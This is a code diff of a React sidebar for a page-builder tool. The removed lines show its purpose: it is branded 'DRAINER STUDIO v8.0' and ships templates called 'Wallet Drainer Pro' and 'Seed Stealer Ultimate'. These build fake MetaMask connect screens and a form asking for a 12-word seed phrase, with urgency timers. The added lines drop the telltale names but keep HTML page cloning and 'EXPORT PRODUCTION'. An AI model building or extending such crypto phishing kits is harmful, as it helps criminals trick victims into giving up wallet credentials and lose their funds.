@@ -1,232 +1,130 @@
-import { useState } from 'react';
+import React from 'react';
+import { Button } from './ui/Button';
+import { Input } from './ui/Input';
+import { Label } from './ui/Label';
+import { Card, CardContent, CardDescription, CardHeader, CardTitle } from './ui/Card';
 import { Element, Template } from '../types/Element';
-import { Button } from '../components/ui/button';
-import { Input } from '../components/ui/input';
-import { Label } from '../components/ui/label';
-import { Slider } from '../components/ui/slider';
 import { 
-  MousePointer, 
-  Type, 
-  Image, 
-  Clock, 
-  BarChart3, 
-  QrCode, 
-  Users, 
-  Sliders, 
-  ToggleLeft,
+  Plus, 
+  Layers, 
+  Layout, 
+  Settings, 
+  Undo, 
+  Redo, 
+  Download, 
   Upload,
-  Grid3x3,
-  Undo,
-  Redo,
-  Download,
-  Layers,
-  Zap,
+  Grid,
+  ZoomIn,
+  Eye,
+  EyeOff,
   FileText,
-  Shield
+  Code,
+  Palette
 } from 'lucide-react';
 
 interface SidebarProps {
+  activeTab: 'elements' | 'templates' | 'layers' | 'controls';
+  setActiveTab: (tab: 'elements' | 'templates' | 'layers' | 'controls') => void;
   elements: Element[];
   selectedId: string | null;
+  setSelectedId: (id: string | null) => void;
+  templates: Template[];
+  loadTemplate: (template: Template) => void;
+  handleDragStart: (type: Element['type']) => void;
   zoom: number;
+  setZoom: (zoom: number) => void;
   showGrid: boolean;
-  onDragStart: (type: Element['type']) => void;
-  onZoomChange: (zoom: number) => void;
-  onToggleGrid: () => void;
-  onUndo: () => void;
-  onRedo: () => void;
-  onExport: () => void;
-  onBackgroundUpload: (e: React.ChangeEvent<HTMLInputElement>) => void;
-  onHTMLUpload: (e: React.ChangeEvent<HTMLInputElement>) => void;
-  onTemplateLoad: (template: Template) => void;
-  onElementSelect: (id: string) => void;
+  setShowGrid: (show: boolean) => void;
+  backgroundImage: string;
+  setBackgroundImage: (url: string) => void;
+  handleUndo: () => void;
+  handleRedo: () => void;
   canUndo: boolean;
   canRedo: boolean;
+  handleExport: () => void;
+  handleHTMLImport: (html: string) => void;
 }
 
-const elementTypes: { type: Element['type']; icon: React.ReactNode; label: string }[] = [
-  { type: 'button', icon: <MousePointer className="w-4 h-4" />, label: 'Button' },
-  { type: 'input', icon: <Type className="w-4 h-4" />, label: 'Input' },
-  { type: 'text', icon: <Type className="w-4 h-4" />, label: 'Text' },
-  { type: 'image', icon: <Image className="w-4 h-4" />, label: 'Image' },
-  { type: 'timer', icon: <Clock className="w-4 h-4" />, label: 'Timer' },
-  { type: 'progress', icon: <BarChart3 className="w-4 h-4" />, label: 'Progress' },
-  { type: 'qr', icon: <QrCode className="w-4 h-4" />, label: 'QR Code' },
-  { type: 'social', icon: <Users className="w-4 h-4" />, label: 'Social' },
-  { type: 'slider', icon: <Sliders className="w-4 h-4" />, label: 'Slider' },
-  { type: 'toggle', icon: <ToggleLeft className="w-4 h-4" />, label: 'Toggle' },
+const elementTypes: Element['type'][] = [
+  'button', 'input', 'text', 'image', 'timer', 
+  'progress', 'qr', 'social', 'slider', 'toggle'
 ];
 
-const templates: Template[] = [
-  {
-    name: 'Wallet Drainer Pro',
-    elements: [
-      {
-        type: 'text',
-        x: 400,
-        y: 100,
-        width: 400,
-        height: 60,
-        text: 'CONNECT WALLET',
-        color: '#ffffff',
-        backgroundColor: 'transparent',
-        rotation: 0,
-        opacity: 1,
-        borderRadius: 0,
-        fontSize: 36,
-        fontWeight: '900',
-        borderStyle: 'none',
-        borderColor: '#000000',
-        borderWidth: 0,
-        zIndex: 1,
-      },
-      {
-        type: 'button',
-        x: 450,
-        y: 250,
-        width: 300,
-        height: 60,
-        text: 'METAMASK',
-        color: '#000000',
-        backgroundColor: '#f6851b',
-        rotation: 0,
-        opacity: 1,
-        borderRadius: 8,
-        fontSize: 18,
-        fontWeight: 'bold',
-        borderStyle: 'none',
-        borderColor: '#000000',
-        borderWidth: 0,
-        zIndex: 2,
-      },
-      {
-        type: 'timer',
-        x: 550,
-        y: 400,
-        width: 100,
-        height: 40,
-        text: '⏱️ 02:00',
-        color: '#ffffff',
-        backgroundColor: 'transparent',
-        rotation: 0,
-        opacity: 1,
-        borderRadius: 0,
-        fontSize: 20,
-        fontWeight: '900',
-        borderStyle: 'none',
-        borderColor: '#000000',
-        borderWidth: 0,
-        zIndex: 3,
-      },
-    ],
-  },
-  {
-    name: 'Seed Stealer Ultimate',
-    elements: [
-      {
-        type: 'text',
-        x: 350,
-        y: 80,
-        width: 500,
-        height: 80,
-        text: 'RECOVER YOUR SEED PHRASE',
-        color: '#ffffff',
-        backgroundColor: 'transparent',
-        rotation: 0,
-        opacity: 1,
-        borderRadius: 0,
-        fontSize: 32,
-        fontWeight: '900',
-        borderStyle: 'none',
-        borderColor: '#000000',
-        borderWidth: 0,
-        zIndex: 1,
-      },
-      {
-        type: 'input',
-        x: 350,
-        y: 200,
-        width: 500,
-        height: 50,
-        text: 'Enter 12-word seed phrase...',
-        color: '#ffffff',
-        backgroundColor: 'rgba(0, 0, 0, 0.5)',
-        rotation: 0,
-        opacity: 1,
-        borderRadius: 8,
-        fontSize: 16,
-        fontWeight: 'normal',
-        borderStyle: 'solid',
-        borderColor: '#00ffff',
-        borderWidth: 2,
-        zIndex: 2,
-      },
-      {
-        type: 'button',
-        x: 450,
-        y: 300,
-        width: 300,
-        height: 60,
-        text: 'RECOVER NOW',
-        color: '#ffffff',
-        backgroundColor: 'linear-gradient(45deg, #00ffff, #ff00ff)',
-        rotation: 0,
-        opacity: 1,
-        borderRadius: 12,
-        fontSize: 20,
-        fontWeight: 'bold',
-        borderStyle: 'none',
-        borderColor: '#000000',
-        borderWidth: 0,
-        zIndex: 3,
-      },
-    ],
-  },
-];
+const elementIcons = {
+  button: '🔘',
+  input: '📝',
+  text: '📄',
+  image: '🖼️',
+  timer: '⏱️',
+  progress: '📊',
+  qr: '📱',
+  social: '🔗',
+  slider: '🎚️',
+  toggle: '🔘'
+};
 
-export const Sidebar = ({
+export const Sidebar: React.FC<SidebarProps> = ({
+  activeTab,
+  setActiveTab,
   elements,
   selectedId,
+  setSelectedId,
+  templates,
+  loadTemplate,
+  handleDragStart,
   zoom,
+  setZoom,
   showGrid,
-  onDragStart,
-  onZoomChange,
-  onToggleGrid,
-  onUndo,
-  onRedo,
-  onExport,
-  onBackgroundUpload,
-  onHTMLUpload,
-  onTemplateLoad,
-  onElementSelect,
+  setShowGrid,
+  backgroundImage,
+  setBackgroundImage,
+  handleUndo,
+  handleRedo,
   canUndo,
   canRedo,
-}: SidebarProps) => {
-  const [activeTab, setActiveTab] = useState<'elements' | 'templates' | 'layers' | 'controls'>('elements');
+  handleExport,
+  handleHTMLImport
+}) => {
+  const handleImageUpload = (e: React.ChangeEvent<HTMLInputElement>) => {
+    const file = e.target.files?.[0];
+    if (file) {
+      const reader = new FileReader();
+      reader.onload = (event) => {
+        setBackgroundImage(event.target?.result as string);
+      };
+      reader.readAsDataURL(file);
+    }
+  };
+
+  const handleHTMLFileUpload = (e: React.ChangeEvent<HTMLInputElement>) => {
+    const file = e.target.files?.[0];
+    if (file && file.type === 'text/html') {
+      const reader = new FileReader();
+      reader.onload = (event) => {
+        const html = event.target?.result as string;
+        handleHTMLImport(html);
+      };
+      reader.readAsText(file);
+    }
+  };
 
   return (
     <div className="w-80 bg-gray-900 border-r border-cyan-500/30 flex flex-col">
-      <div className="p-4 border-b border-cyan-500/30">
-        <h1 className="text-xl font-black text-white leading-tight">
-          DRAINER STUDIO v8.0
-        </h1>
-        <p className="text-white text-xs mt-1 font-bold">ULTIMATE EDITION</p>
-      </div>
-
-      <div className="flex border-b border-cyan-500/30">
+      {/* Tabs */}
+      <div className="flex border-b border-gray-700">
         {[
-          { id: 'elements', label: 'Elements', icon: <Zap className="w-3 h-3" /> },
-          { id: 'templates', label: 'Templates', icon: <Layers className="w-3 h-3" /> },
-          { id: 'layers', label: 'Layers', icon: <Layers className="w-3 h-3" /> },
-          { id: 'controls', label: 'Controls', icon: <Sliders className="w-3 h-3" /> },
-        ].map((tab) => (
+          { id: 'elements', icon: <Plus size={16} />, label: 'Elements' },
+          { id: 'templates', icon: <Layout size={16} />, label: 'Templates' },
+          { id: 'layers', icon: <Layers size={16} />, label: 'Layers' },
+          { id: 'controls', icon: <Settings size={16} />, label: 'Controls' }
+        ].map(tab => (
           <button
             key={tab.id}
             onClick={() => setActiveTab(tab.id as any)}
-            className={`flex-1 py-3 px-2 text-xs font-bold uppercase tracking-wider transition-all flex items-center justify-center gap-1 ${
-              activeTab === tab.id
-                ? 'bg-cyan-500/20 text-white border-b-2 border-cyan-400'
-                : 'text-white hover:text-gray-200'
+            className={`flex-1 flex items-center justify-center gap-2 py-3 text-xs transition-colors ${
+              activeTab === tab.id 
+                ? 'bg-cyan-600 text-white' 
+                : 'text-gray-400 hover:text-white hover:bg-gray-800'
             }`}
           >
             {tab.icon}
@@ -235,24 +133,21 @@ export const Sidebar = ({
         ))}
       </div>
 
+      {/* Content */}
       <div className="flex-1 overflow-y-auto p-4">
         {activeTab === 'elements' && (
-          <div className="space-y-2">
-            <h3 className="text-white font-bold text-xs uppercase tracking-wider mb-3">
-              Drag Elements to Canvas
-            </h3>
-            {elementTypes.map(({ type, icon, label }) => (
+          <div className="space-y-3">
+            <h3 className="text-cyan-400 font-bold mb-3">Drag Elements</h3>
+            {elementTypes.map(type => (
               <div
                 key={type}
                 draggable
-                onDragStart={() => onDragStart(type)}
-                className="bg-gray-800 border border-cyan-500/30 rounded-lg p-3 cursor-move hover:bg-cyan-500/10 hover:border-cyan-500/50 transition-all group"
+                onDragStart={() => handleDragStart(type)}
+                className="bg-gray-800 border border-gray-700 rounded-lg p-3 cursor-move hover:border-cyan-500 hover:bg-gray-750 transition-all"
               >
                 <div className="flex items-center gap-3">
-                  <div className="text-white group-hover:text-gray-200 transition-colors">
-                    {icon}
-                  </div>
-                  <span className="text-white font-medium">{label}</span>
+                  <span className="text-2xl">{elementIcons[type]}</span>
+                  <span className="text-white capitalize">{type}</span>
                 </div>
               </div>
             ))}
@@ -260,167 +155,191 @@ export const Sidebar = ({
         )}
 
         {activeTab === 'templates' && (
-          <div className="space-y-2">
-            <h3 className="text-white font-bold text-xs uppercase tracking-wider mb-3">
-              Quick Start Templates
-            </h3>
-            {templates.map((template) => (
-              <button
-                key={template.name}
-                onClick={() => onTemplateLoad(template)}
-                className="w-full bg-gradient-to-r from-purple-900/50 to-cyan-900/50 border border-cyan-500/30 rounded-lg p-4 hover:from-purple-900/70 hover:to-cyan-900/70 transition-all text-left"
-              >
-                <div className="text-white font-bold">{template.name}</div>
-                <div className="text-white text-xs mt-1">
-                  {template.elements.length} elements
-                </div>
-              </button>
+          <div className="space-y-3">
+            <h3 className="text-cyan-400 font-bold mb-3">Templates</h3>
+            
+            {/* 🎨 Design-Only HTML Import Section */}
+            <div className="mb-4 p-3 bg-gray-800 rounded-lg border border-gray-700">
+              <div className="flex items-center gap-2 mb-2">
+                <Palette size={16} className="text-cyan-400" />
+                <Label className="text-sm font-semibold text-cyan-400">Import Design Only</Label>
+              </div>
+              <Input
+                type="file"
+                accept=".html,.htm"
+                onChange={handleHTMLFileUpload}
+                className="text-xs mb-2"
+              />
+              <p className="text-xs text-gray-400">
+                Extract visual elements only (no forms, links, or functionality)
+              </p>
+            </div>
+
+            {templates.map(template => (
+              <Card key={template.id} className="cursor-pointer hover:border-cyan-500 transition-all">
+                <CardHeader className="pb-2">
+                  <CardTitle className="text-sm">{template.name}</CardTitle>
+                  <CardDescription className="text-xs">{template.description}</CardDescription>
+                </CardHeader>
+                <CardContent>
+                  <Button 
+                    size="sm" 
+                    className="w-full"
+                    onClick={() => loadTemplate(template)}
+                  >
+                    Load Template
+                  </Button>
+                </CardContent>
+              </Card>
             ))}
           </div>
         )}
 
         {activeTab === 'layers' && (
           <div className="space-y-2">
-            <h3 className="text-white font-bold text-xs uppercase tracking-wider mb-3">
-              Element Layers
-            </h3>
-            {elements.length === 0 ? (
-              <div className="text-white text-sm">No elements yet</div>
-            ) : (
-              [...elements].reverse().map((element) => (
-                <button
-                  key={element.id}
-                  onClick={() => onElementSelect(element.id)}
-                  className={`w-full bg-gray-800 border rounded-lg p-3 text-left transition-all ${
-                    selectedId === element.id
-                      ? 'border-cyan-400 bg-cyan-500/10'
-                      : 'border-cyan-500/30 hover:border-cyan-500/50'
-                  }`}
-                >
-                  <div className="flex items-center justify-between">
-                    <span className="text-white font-medium capitalize">
-                      {element.type}
-                    </span>
-                    <span className="text-white text-xs">
-                      {Math.round(element.x)}, {Math.round(element.y)}
-                    </span>
-                  </div>
-                  <div className="text-white text-xs mt-1 truncate">
-                    {element.text}
-                  </div>
-                </button>
-              ))
+            <h3 className="text-cyan-400 font-bold mb-3">Layers</h3>
+            {[...elements].reverse().map(element => (
+              <div
+                key={element.id}
+                onClick={() => setSelectedId(element.id)}
+                className={`p-2 rounded cursor-pointer transition-all ${
+                  selectedId === element.id 
+                    ? 'bg-cyan-600 text-white' 
+                    : 'bg-gray-800 text-gray-300 hover:bg-gray-700'
+                }`}
+              >
+                <div className="flex items-center justify-between">
+                  <span className="text-sm">{elementIcons[element.type]} {element.type}</span>
+                  <span className="text-xs text-gray-400">
+                    {Math.round(element.x)}, {Math.round(element.y)}
+                  </span>
+                </div>
+              </div>
+            ))}
+            {elements.length === 0 && (
+              <p className="text-gray-500 text-center py-4">No elements yet</p>
             )}
           </div>
         )}
 
         {activeTab === 'controls' && (
           <div className="space-y-4">
+            <h3 className="text-cyan-400 font-bold mb-3">Controls</h3>
+            
+            {/* Zoom */}
             <div>
-              <Label className="text-white text-xs uppercase tracking-wider font-bold">Zoom</Label>
-              <div className="flex items-center gap-2 mt-2">
-                <Slider
-                  value={[zoom]}
-                  onValueChange={([value]) => onZoomChange(value)}
-                  max={2}
-                  min={0.5}
-                  step={0.1}
-                  className="flex-1"
-                />
-                <span className="text-white text-sm w-12 font-bold">{Math.round(zoom * 100)}%</span>
-              </div>
+              <Label className="text-xs text-gray-400">Zoom: {Math.round(zoom * 100)}%</Label>
+              <input
+                type="range"
+                min="0.5"
+                max="2"
+                step="0.1"
+                value={zoom}
+                onChange={(e) => setZoom(Number(e.target.value))}
+                className="w-full mt-1"
+              />
             </div>
 
-            <div className="space-y-2">
-              <button
-                onClick={onToggleGrid}
-                className={`w-full py-2 px-4 rounded-lg font-medium text-sm transition-all ${
-                  showGrid
-                    ? 'bg-cyan-500/20 text-white border border-cyan-500/50'
-                    : 'bg-gray-800 text-white border border-gray-700 hover:border-cyan-500/30'
-                }`}
+            {/* Grid Toggle */}
+            <div className="flex items-center justify-between">
+              <Label className="text-xs text-gray-400">Show Grid</Label>
+              <Button
+                size="sm"
+                variant={showGrid ? "default" : "outline"}
+                onClick={() => setShowGrid(!showGrid)}
               >
-                <Grid3x3 className="inline w-4 h-4 mr-2" />
-                {showGrid ? 'Hide Grid' : 'Show Grid'}
-              </button>
+                {showGrid ? <Eye size={14} /> : <EyeOff size={14} />}
+              </Button>
+            </div>
 
-              <div className="flex gap-2">
-                <button
-                  onClick={onUndo}
-                  disabled={!canUndo}
-                  className="flex-1 py-2 px-4 bg-gray-800 text-white rounded-lg font-medium text-sm transition-all hover:bg-gray-700 disabled:opacity-50 disabled:cursor-not-allowed"
-                >
-                  <Undo className="inline w-4 h-4 mr-2" />
-                  Undo
-                </button>
-                <button
-                  onClick={onRedo}
-                  disabled={!canRedo}
-                  className="flex-1 py-2 px-4 bg-gray-800 text-white rounded-lg font-medium text-sm transition-all hover:bg-gray-700 disabled:opacity-50 disabled:cursor-not-allowed"
-                >
-                  <Redo className="inline w-4 h-4 mr-2" />
-                  Redo
-                </button>
-              </div>
-
-              <div className="bg-yellow-900/20 border border-yellow-500/30 rounded-lg p-3">
-                <div className="flex items-center gap-2 mb-2">
-                  <Shield className="w-4 h-4 text-yellow-400" />
-                  <span className="text-yellow-400 font-bold text-xs">DESIGN-ONLY MODE</span>
-                </div>
-                <p className="text-white text-xs">
-                  HTML import preserves visual styling only. All functionality is disabled for safety.
-                </p>
-              </div>
-
-              <div>
-                <Label className="text-white text-xs uppercase tracking-wider font-bold block mb-2">
-                  Upload HTML File (Visual Only)
-                </Label>
-                <input
-                  type="file"
-                  accept=".html,.htm"
-                  onChange={onHTMLUpload}
-                  className="hidden"
-                  id="html-upload"
-                />
-                <label
-                  htmlFor="html-upload"
-                  className="block w-full py-2 px-4 bg-gray-800 text-white rounded-lg font-medium text-sm transition-all hover:bg-gray-700 cursor-pointer text-center"
-                >
-                  <FileText className="inline w-4 h-4 mr-2" />
-                  Import HTML Design
-                </label>
-              </div>
-
-              <div>
-                <Label className="text-white text-xs uppercase tracking-wider font-bold block mb-2">
-                  Background Image
-                </Label>
-                <input
+            {/* 🖼️ Background Image Uploader */}
+            <div>
+              <Label className="text-xs text-gray-400 flex items-center gap-2">
+                <Upload size={12} />
+                Background Image
+              </Label>
+              <div className="mt-2 space-y-2">
+                <Input
                   type="file"
                   accept="image/*"
-                  onChange={onBackgroundUpload}
-                  className="hidden"
-                  id="bg-upload"
+                  onChange={handleImageUpload}
+                  className="text-xs"
                 />
-                <label
-                  htmlFor="bg-upload"
-                  className="block w-full py-2 px-4 bg-gray-800 text-white rounded-lg font-medium text-sm transition-all hover:bg-gray-700 cursor-pointer text-center"
-                >
-                  <Upload className="inline w-4 h-4 mr-2" />
-                  Upload Background
-                </label>
+                {backgroundImage && (
+                  <div className="space-y-2">
+                    <div className="text-xs text-green-400">✓ Image loaded</div>
+                    <Button
+                      size="sm"
+                      variant="outline"
+                      className="w-full text-xs"
+                      onClick={() => setBackgroundImage('')}
+                    >
+                      Clear Background
+                    </Button>
+                  </div>
+                )}
               </div>
-
-              <button
-                onClick={onExport}
-                className="w-full py-3 px-4 bg-gradient-to-r from-cyan-500 to-purple-600 text-white rounded-lg font-bold text-sm uppercase tracking-wider transition-all hover:from-cyan-600 hover:to-purple-700 shadow-lg hover:shadow-cyan-500/50"
-              >
-                <Download className="inline w-4 h-4 mr-2" />
-                Export Production
-              </button>
             </div>
+
+            {/* 🎨 Design-Only HTML Code Import */}
+            <div>
+              <Label className="text-xs text-gray-400 flex items-center gap-2">
+                <Palette size={12} />
+                Import Design HTML
+              </Label>
+              <textarea
+                className="w-full mt-2 h-20 p-2 text-xs bg-gray-800 border border-gray-600 rounded text-white placeholder-gray-400"
+                placeholder="Paste HTML design code here (visual elements only)..."
+                onChange={(e) => {
+                  if (e.target.value.includes('<') && e.target.value.includes('>')) {
+                    // Auto-detect HTML and offer import
+                  }
+                }}
+              />
+              <Button
+                size="sm"
+                variant="outline"
+                className="w-full mt-2 text-xs"
+                onClick={() => {
+                  const textarea = document.querySelector('textarea[placeholder*="Paste HTML design"]') as HTMLTextAreaElement;
+                  if (textarea?.value) {
+                    handleHTMLImport(textarea.value);
+                    textarea.value = '';
+                  }
+                }}
+              >
+                Import Design Only
+              </Button>
+            </div>
+
+            {/* History Controls */}
+            <div className="flex gap-2">
+              <Button
+                size="sm"
+                onClick={handleUndo}
+                disabled={!canUndo}
+                className="flex-1"
+              >
+                <Undo size={14} />
+              </Button>
+              <Button
+                size="sm"
+                onClick={handleRedo}
+                disabled={!canRedo}
+                className="flex-1"
+              >
+                <Redo size={14} />
+              </Button>
+            </div>
+
+            {/* Export */}
+            <Button
+              onClick={handleExport}
+              className="w-full bg-green-600 hover:bg-green-700"
+            >
+              <Download size={14} className="mr-2" />
+              EXPORT PRODUCTION
+            </Button>
           </div>
         )}
       </div>
